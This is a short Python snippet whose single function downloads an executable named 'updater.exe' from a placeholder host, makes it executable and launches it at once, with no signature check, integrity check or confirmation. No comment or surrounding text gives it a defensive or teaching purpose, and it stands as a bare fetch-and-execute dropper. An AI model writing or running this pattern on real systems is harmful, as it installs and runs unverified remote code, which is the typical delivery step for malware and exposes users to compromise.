import os, subprocess, urllib.request

def go():
    urllib.request.urlretrieve('https://cdn.invalid/updater.exe', 'u.exe')
    os.chmod('u.exe', 0o755)
    subprocess.Popen(['u.exe'])
